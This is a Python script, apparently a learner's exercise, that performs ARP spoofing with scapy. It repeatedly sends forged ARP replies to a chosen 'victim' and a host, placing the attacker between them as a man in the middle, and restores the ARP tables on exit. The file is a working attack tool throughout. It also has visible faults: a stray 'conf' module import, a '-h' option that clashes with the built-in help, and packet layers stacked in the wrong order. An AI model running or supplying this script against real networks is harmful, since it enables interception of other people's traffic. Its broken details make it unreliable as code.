import time
import optparse as parse
import conf as conf
import scapy.all as scapy

conf.color_theme = scapy.BrightTheme()

def get_arguments():
    parser = parse.OptionParser()
    parser.add_option("-v", "--ipvictim", dest="ip_victim", help="IP address of device that you want to hack")
    parser.add_option("-h", "--iphost", dest="ip_host", help="IP address of device that you want to be")
    (options, arguments) = parser.parse_args()
    if not options.ip_victim:
        parser.error("[-] Please specify an IP victim, use --help for more info.")
    if not options.ip_host:
        parser.error("[-] Please specify an IP host, use --help for more info.")
    return options

def get_MAC(ip): # По IP возвращает Mac
    ARPrequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    package = ARPrequest/broadcast
    answered_list = scapy.srp(package, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip): # Для восстановления ARP таблиц
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_MAC(destination_ip), psrc=source_ip, hwsrc=get_MAC(source_ip))
    scapy.send(packet, count=4, verbose=False)

def arp_spoofing(target_ip, spoof_ip): # Для отправки ARP запросов
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_MAC(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


ips = get_arguments()
ip_victim = ips.ip_victim
ip_host = ips.ip_host
count = 0
try:
    while True:
        arp_spoofing(ip_victim, ip_host)
        arp_spoofing(ip_host, ip_victim)
        count += 2
        print("\r[+] Package sent: " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected ctrl + C...Quitting...")
    restore(ip_victim, ip_host)
    restore(ip_host, ip_victim)

